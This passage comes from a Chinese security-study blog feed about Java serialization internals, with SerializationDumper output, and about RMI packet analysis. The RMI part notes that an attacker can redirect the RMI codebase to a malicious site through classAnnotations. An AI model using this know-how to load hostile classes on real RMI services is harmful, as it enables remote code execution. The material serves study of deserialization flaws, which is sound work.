<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20240103161934137.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20240103161934137.png" alt="image-20240103161934137"></a></p>
<p>于是当尝试修改默认值，看看能否修改readObject的值，</p>
<p>但是发现<code>readObject</code>中的值还是默认值0，这是因为在调用<code>s.defaultReadObject()</code>反序列化之前，<code>readObject</code>获取的变量的值都只是默认值。</p>
<p>因为在反序列化之后，变量值又会为反序列化出来的值，这样就没必要再次读取当前变量的值浪费资源。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20240103172414854.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20240103172414854.png" alt="image-20240103172414854"></a></p>
<p>但是如何使得<code>readObject</code>中的变量的值不再是默认值呢</p>
<p>虽然<code>readObject</code>不会读取变量的定义值，也就是不会读取这个变量的赋值操作，但是如果这个变量并不是当前类中的，而是从父类继承而来的，那子类最后获取的就是一个自带值的变量，而子类也无法访问父类的赋值过程，就算<code>readObject</code>不进行赋值操作，但是最后获得变量却是自带值的，某种意义上来说相当于在Person类中修改了<code>age</code>变量的初始值。</p>
<p>如下，<code>name</code>和<code>age</code>的值从Example类中继承，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20240103174707394.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20240103174707394.png" alt="image-20240103174707394"></a></p>
<p>执行结果，<code>readObject</code>中<code>age</code>也为<code>1000</code>，因为其能访问的变量<code>age</code>是来自父类，自带值<code>1000</code>，无法不进行赋值，这里相当于在<code>Person</code>类中<code>age</code>的默认值为<code>1000</code>。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20240103174759861.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20240103174759861.png" alt="image-20240103174759861"></a></p>
<p>将父类修改回<code>john</code>和<code>20</code>，再反序列化看看结构有没有什么变化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Ser_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;John&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">extends</span> <span class="title class_">Example</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span><br><span class="line">            IOException &#123;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;age in writeObject is &quot;+age);</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;age in readObject is &quot;+age);</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) s.readObject();</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;per.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(p);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;per.ser&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用<code>SerializationDumper</code>得出的结构，发现<code>classdata</code>中没有了<code>name</code>和<code>age</code>的值，这是因这两个变量是来自父类的，但是父类没有<code>Serializable</code>接口，所以无法进行序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">12</span> - <span class="number">0x00</span> 0c</span><br><span class="line">        Value - Ser_1.Person - <span class="number">0x5365725f312e506572736f6e</span></span><br><span class="line">      serialVersionUID - <span class="number">0x50</span> <span class="number">4f</span> bf 8b 9e <span class="number">3f</span> bd e4</span><br><span class="line">      newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">      fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">    classdata</span><br><span class="line">      Ser_1.Person</span><br><span class="line">        values</span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - <span class="number">0x74</span></span><br><span class="line">            newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">            Length - <span class="number">16</span> - <span class="number">0x00</span> <span class="number">10</span></span><br><span class="line">            Value - This is a object - <span class="number">0x546869732069732061206f626a656374</span></span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20240103175852659.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20240103175852659.png" alt="image-20240103175852659"></a></p>
<p>如果想要将父类Example也实例化，给父类也加上<code>Serializable</code>接口就行，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;John&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就可以得到结构，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">12</span> - <span class="number">0x00</span> 0c</span><br><span class="line">        Value - Ser_1.Person - <span class="number">0x5365725f312e506572736f6e</span></span><br><span class="line">      serialVersionUID - <span class="number">0x50</span> <span class="number">4f</span> bf 8b 9e <span class="number">3f</span> bd e4</span><br><span class="line">      newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">      fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">          className</span><br><span class="line">            Length - <span class="number">13</span> - <span class="number">0x00</span> <span class="number">0d</span></span><br><span class="line">            Value - Ser_1.Example - <span class="number">0x5365725f312e4578616d706c65</span></span><br><span class="line">          serialVersionUID - <span class="number">0xfe</span> a1 <span class="number">35</span> <span class="number">71</span> e0 5e <span class="number">93</span> ad</span><br><span class="line">          newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">          classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">          fieldCount - <span class="number">2</span> - <span class="number">0x00</span> <span class="number">02</span></span><br><span class="line">          Fields</span><br><span class="line">            <span class="number">0</span>:</span><br><span class="line">              Int - I - <span class="number">0x49</span></span><br><span class="line">              fieldName</span><br><span class="line">                Length - <span class="number">3</span> - <span class="number">0x00</span> <span class="number">03</span></span><br><span class="line">                Value - age - <span class="number">0x616765</span></span><br><span class="line">            <span class="number">1</span>:</span><br><span class="line">              Object - L - <span class="number">0x4c</span></span><br><span class="line">              fieldName</span><br><span class="line">                Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">                Value - name - <span class="number">0x6e616d65</span></span><br><span class="line">              className1</span><br><span class="line">                TC_STRING - <span class="number">0x74</span></span><br><span class="line">                  newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">                  Length - <span class="number">18</span> - <span class="number">0x00</span> <span class="number">12</span></span><br><span class="line">                  Value - Ljava/lang/String; - <span class="number">0x4c6a6176612f6c616e672f537472696e673b</span></span><br><span class="line">          classAnnotations</span><br><span class="line">            TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">          superClassDesc</span><br><span class="line">            TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">    classdata</span><br><span class="line">      Ser_1.Example</span><br><span class="line">        values</span><br><span class="line">          <span class="title function_">age</span></span><br><span class="line">            <span class="params">(<span class="type">int</span>)</span><span class="number">20</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line">          name</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - <span class="number">0x74</span></span><br><span class="line">                newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">04</span></span><br><span class="line">                Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">                Value - John - <span class="number">0x4a6f686e</span></span><br><span class="line">      Ser_1.Person</span><br><span class="line">        values</span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - <span class="number">0x74</span></span><br><span class="line">            newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">05</span></span><br><span class="line">            Length - <span class="number">16</span> - <span class="number">0x00</span> <span class="number">10</span></span><br><span class="line">            Value - This is a object - <span class="number">0x546869732069732061206f626a656374</span></span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br></pre></td></tr></table></figure>

<p>相比没给父类加上序列化接口，在<code>superClassDesc</code>中多了以下内容，发现它对这个父类进行一定的描述，名字长度，变量字段以及值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">className</span><br><span class="line">          Length - <span class="number">13</span> - <span class="number">0x00</span> <span class="number">0d</span></span><br><span class="line">          Value - Ser_1.Example - <span class="number">0x5365725f312e4578616d706c65</span></span><br><span class="line">        serialVersionUID - <span class="number">0xfe</span> a1 <span class="number">35</span> <span class="number">71</span> e0 5e <span class="number">93</span> ad</span><br><span class="line">        newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">        classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">        fieldCount - <span class="number">2</span> - <span class="number">0x00</span> <span class="number">02</span></span><br><span class="line">        Fields</span><br><span class="line">          <span class="number">0</span>:</span><br><span class="line">            Int - I - <span class="number">0x49</span></span><br><span class="line">            fieldName</span><br><span class="line">              Length - <span class="number">3</span> - <span class="number">0x00</span> <span class="number">03</span></span><br><span class="line">              Value - age - <span class="number">0x616765</span></span><br><span class="line">          <span class="number">1</span>:</span><br><span class="line">            Object - L - <span class="number">0x4c</span></span><br><span class="line">            fieldName</span><br><span class="line">              Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">              Value - name - <span class="number">0x6e616d65</span></span><br><span class="line">            className1</span><br><span class="line">              TC_STRING - <span class="number">0x74</span></span><br><span class="line">                newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">                Length - <span class="number">18</span> - <span class="number">0x00</span> <span class="number">12</span></span><br><span class="line">                Value - Ljava/lang/String; - <span class="number">0x4c6a6176612f6c616e672f537472696e673b</span></span><br><span class="line">        classAnnotations</span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">        superClassDesc</span><br><span class="line">          TC_NULL - <span class="number">0x70</span></span><br><span class="line">  newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">  classdata</span><br><span class="line">    Ser_1.Example</span><br><span class="line">      values</span><br><span class="line">        <span class="title function_">age</span></span><br><span class="line">          <span class="params">(<span class="type">int</span>)</span><span class="number">20</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line">        name</span><br><span class="line">          (object)</span><br><span class="line">            TC_STRING - <span class="number">0x74</span></span><br><span class="line">              newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">04</span></span><br><span class="line">              Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">              Value - John - <span class="number">0x4a6f686e</span></span><br></pre></td></tr></table></figure>

<h3 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h3><blockquote>
<p>Python反序列化和Java、PHP有个显著的区别，就是Python的反序列化过程实际上是在执行一个基于栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。<br>所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加危险。<br>有关于Python反序列化的一些有趣的操作，</p>
<p>可以参考p神的另一篇文章<a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">《Code-Breaking中的两个Python沙箱》</a>。<br>总结一下，从危害上来看，Python的反序列化危害是最大的；从应用广度上来看，Java的反序列化是最常被用到的；从反序列化的原理上来看，PHP和Java是类似又不尽相同的。后文我将从一个非常简单的Gadget，即URLDNS入手，带大家深入理解反序列化漏洞的美妙。</p>
</blockquote>
]]></content>
      <categories>
        <category>Java漫谈学习</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全[RMI(3)]</title>
    <url>/Java%E5%AE%89%E5%85%A8%5BRMI(3)%5D/</url>
    <content><![CDATA[<p><code>RMI2</code>中成功实现了codebase进行加载恶意类，但是在实际环境确实难实现符合环境，所以只作为一个了解和认识。</p>
<p>这篇文章主要分析codebase是如何在RMI中进行传递的，以及对分析Java序列化数据的工具<code>SerializationDumper</code>的使用介绍</p>
<span id="more"></span>

<h1 id="Java安全-RMI-3"><a href="#Java安全-RMI-3" class="headerlink" title="Java安全[RMI(3)]"></a>Java安全[RMI(3)]</h1><h2 id="数据包解析以及SerializationDumper工具"><a href="#数据包解析以及SerializationDumper工具" class="headerlink" title="数据包解析以及SerializationDumper工具"></a>数据包解析以及SerializationDumper工具</h2><p>这里选择的是<code>JRMI,Call</code>的数据包，打开右键<code>Java Serialization</code>数据段，复制<code>Hex Stream</code>，看到<code>ac ed</code>就知道后面是java序列化数据</p>
<blockquote>
<p>我们可以用 </p>
<p><code>tcp.stream eq 0</code> 来筛选出本机与RMI Registry的数据流</p>
<p><code>tcp.stream eq 1</code> 来筛选出本机与RMI Server的数据流</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(3)%5D/image-20231025005115061.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(3)]/image-20231025005115061.png" alt="image-20231025005115061"></a></p>
<p>将复制的<code>Hex Stream</code>用工具解析</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(3)%5D/image-20231025005053560.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(3)]/image-20231025005053560.png" alt="image-20231025005053560"></a></p>
<p>但是有很多参数看不懂，可以看看Java序列化的协议文档：</p>
<p><code>https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html</code></p>
<p>这篇文档里用了一种类似BNF（巴科斯范式）的形式描述了序列化数据的语法，比如我们这里的这段简单的数据，其涉及到如下语法规则： </p>
<blockquote>
<p>stream:<br>magic version contents<br>contents:<br>content<br>contents content<br>content:<br>object<br>blockdata<br>object:<br>newObject<br>newClass<br>newArray<br>newString<br>newEnum<br>newClassDesc<br>prevObject<br>nullReference<br>exception<br>TC_RESET<br>blockdata:<br>blockdatashort<br>blockdatalong<br>blockdatashort:<br>TC_BLOCKDATA (unsigned byte)<size> (byte)[size]<br>newString:<br>TC_STRING newHandle (utf)<br>TC_LONGSTRING newHandle (long-utf)</size></p>
</blockquote>
<p>其中 <code>TC_BLOCKDATA</code> 这部分对应的是 <code>contents -&gt; content -&gt; blockdata -&gt; blockdatashort</code> ， <code>TC_STRING</code> 这部分对应的是 <code>contents -&gt; content -&gt; object-&gt; newString</code> 。都可以在文档里找到完 整的语法定义。 这一整个序列化对象，其实描述的就是一个字符串，其值是 <code>refObj</code> 。意思是获取远程的 <code>refObj</code> 对 象。</p>
<p><code>JRMI,ReturnData</code>数据包大一些，下面用它来展示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">    Length - <span class="number">15</span> - <span class="number">0x0f</span></span><br><span class="line">    Contents - <span class="number">0x0120dea1410000018b3e3ad3308005</span></span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_PROXYCLASSDESC - <span class="number">0x7d</span></span><br><span class="line">      newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      Interface count - <span class="number">2</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span></span><br><span class="line">      proxyInterfaceNames</span><br><span class="line">        <span class="number">0</span>:</span><br><span class="line">          Length - <span class="number">15</span> - <span class="number">0x00</span> <span class="number">0f</span></span><br><span class="line">          Value - java.rmi.Remote - <span class="number">0x6a6176612e726d692e52656d6f7465</span></span><br><span class="line">        <span class="number">1</span>:</span><br><span class="line">          Length - <span class="number">11</span> - <span class="number">0x00</span> 0b</span><br><span class="line">          Value - RMI_2.ICalc - <span class="number">0x524d495f322e4943616c63</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">          className</span><br><span class="line">            Length - <span class="number">23</span> - <span class="number">0x00</span> <span class="number">17</span></span><br><span class="line">            Value - java.lang.reflect.Proxy - <span class="number">0x6a6176612e6c616e672e7265666c6563742e50726f7879</span></span><br><span class="line">          serialVersionUID - <span class="number">0xe1</span> <span class="number">27</span> da <span class="number">20</span> cc <span class="number">10</span> <span class="number">43</span> cb</span><br><span class="line">          newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">          classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">          fieldCount - <span class="number">1</span> - <span class="number">0x00</span> <span class="number">01</span></span><br><span class="line">          Fields</span><br><span class="line">            <span class="number">0</span>:</span><br><span class="line">              Object - L - <span class="number">0x4c</span></span><br><span class="line">              fieldName</span><br><span class="line">                Length - <span class="number">1</span> - <span class="number">0x00</span> <span class="number">01</span></span><br><span class="line">                Value - h - <span class="number">0x68</span></span><br><span class="line">              className1</span><br><span class="line">                TC_STRING - <span class="number">0x74</span></span><br><span class="line">                  newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">                  Length - <span class="number">37</span> - <span class="number">0x00</span> <span class="number">25</span></span><br><span class="line">                  Value - Ljava/lang/reflect/InvocationHandler; - <span class="number">0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b</span></span><br><span class="line">          classAnnotations</span><br><span class="line">            TC_NULL - <span class="number">0x70</span></span><br><span class="line">            TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">          superClassDesc</span><br><span class="line">            TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">    classdata</span><br><span class="line">      java.lang.reflect.Proxy</span><br><span class="line">        values</span><br><span class="line">          <span class="title function_">h</span></span><br><span class="line">            <span class="params">(object)</span></span><br><span class="line">              TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">                TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">                  className</span><br><span class="line">                    Length - <span class="number">45</span> - <span class="number">0x00</span> <span class="number">2d</span></span><br><span class="line">                    Value - java.rmi.server.RemoteObjectInvocationHandler - <span class="number">0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572</span></span><br><span class="line">                  serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span></span><br><span class="line">                  newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">04</span></span><br><span class="line">                  classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">                  fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">                  classAnnotations</span><br><span class="line">                    TC_NULL - <span class="number">0x70</span></span><br><span class="line">                    TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">                  superClassDesc</span><br><span class="line">                    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">                      className</span><br><span class="line">                        Length - <span class="number">28</span> - <span class="number">0x00</span> 1c</span><br><span class="line">                        Value - java.rmi.server.RemoteObject - <span class="number">0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374</span></span><br><span class="line">                      serialVersionUID - <span class="number">0xd3</span> <span class="number">61</span> b4 <span class="number">91</span> 0c <span class="number">61</span> <span class="number">33</span> 1e</span><br><span class="line">                      newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">05</span></span><br><span class="line">                      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">                      fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">                      classAnnotations</span><br><span class="line">                        TC_NULL - <span class="number">0x70</span></span><br><span class="line">                        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">                      superClassDesc</span><br><span class="line">                        TC_NULL - <span class="number">0x70</span></span><br><span class="line">                newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">06</span></span><br><span class="line">                classdata</span><br><span class="line">                  java.rmi.server.RemoteObject</span><br><span class="line">                    values</span><br><span class="line">                    objectAnnotation</span><br><span class="line">                      TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">                        Length - <span class="number">56</span> - <span class="number">0x38</span></span><br><span class="line">                        Contents - <span class="number">0x000a556e6963617374526566000f3139322e3136382e3136392e3134360000c5b2e3476369ea6a56e120dea1410000018b3e3ad330800101</span></span><br><span class="line">                      TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">                  java.rmi.server.RemoteObjectInvocationHandler</span><br><span class="line">                    values</span><br><span class="line">      &lt;Dynamic Proxy Class&gt;</span><br></pre></td></tr></table></figure>

<p>这是个<code>java.lang.reflect.Proxy</code>对象，其中有段数据存储在<code>objectAnnotation</code>中:<code>0x000a556e6963617374526566000f3139322e3136382e3136392e3134360000c5b2e3476369ea6a56e120dea1410000018b3e3ad330800101</code></p>
<p>这段数据记录了RMI Server的地址和端口。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(3)%5D/image-20231025010959831.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(3)]/image-20231025010959831.png" alt="image-20231025010959831"></a></p>
<p>然后再看看，本机与RMI Server的交互，虽然wireshark没有识别出RMI，但是从数据包中可以看到<code>50 ac ed</code>，所以是存在序列化数据，一样用工具解析试试，只保留<code>ac ed</code>开头。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(3)%5D/image-20231025011457922.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(3)]/image-20231025011457922.png" alt="image-20231025011457922"></a></p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(3)%5D/image-20231025012001967.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(3)]/image-20231025012001967.png" alt="image-20231025012001967"></a></p>
<p>可以看到<code>codebase</code>是通过过 <code>java.rmi.server.Obj</code>;的 <code>classAnnotations</code> 传递的。</p>
<p>&#x3D; &gt;即使我们没有RMI的客户端，只需要修改 <code>classAnnotations</code> 的值，就能控制<code>codebase</code>，使其 指向攻击者的恶意网站。</p>
<h2 id="classAnnotations是什么？"><a href="#classAnnotations是什么？" class="headerlink" title="classAnnotations是什么？"></a>classAnnotations是什么？</h2><blockquote>
<p>在序列化Java类的时候用到了一个类，叫 <code>ObjectOutputStream</code> 。这个类内部有一个方法 <code>annotateClass</code> ， <code>ObjectOutputStream</code> 的子类有需要向序列化后的数据里放任何内容，都可以重写 这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p>
<p>比如，我们RMI的类 MarshalOutputStream 就将当前的 codebase 写入： </p>
<ul>
<li><code>https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1cfe07fd4260b83ae86e39f80c0a9ff2/src/share/classes/java/rmi/server/RMIClassLoader.java#L657</code> </li>
<li><code>https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1c/src/share/classes/sun/rmi/server/LoaderHandler.java#L282</code></li>
</ul>
<p>所以，我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的 内容。</p>
</blockquote>
]]></content>
      <categories>
        <category>Java漫谈学习</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全[RMI(2)]</title>
    <url>/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/</url>
    <content><![CDATA[<p>从RMI第一篇描述了RMI的通信过程和组成成分，总结一下，一个RMI过程有以下三个参与者：</p>
<blockquote>
<ul>
<li><code>RMI Registry</code></li>
<li><code>RMI Server</code></li>
<li><code>RMI Client</code></li>
</ul>
</blockquote>
<p>但是对于RMI Registry来说，一般在创建时，就直接和服务器端的一个对象进行绑定，所以最后只有Server和Client两部分代码，而Server中就自然包含了Registry和Server两部分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>

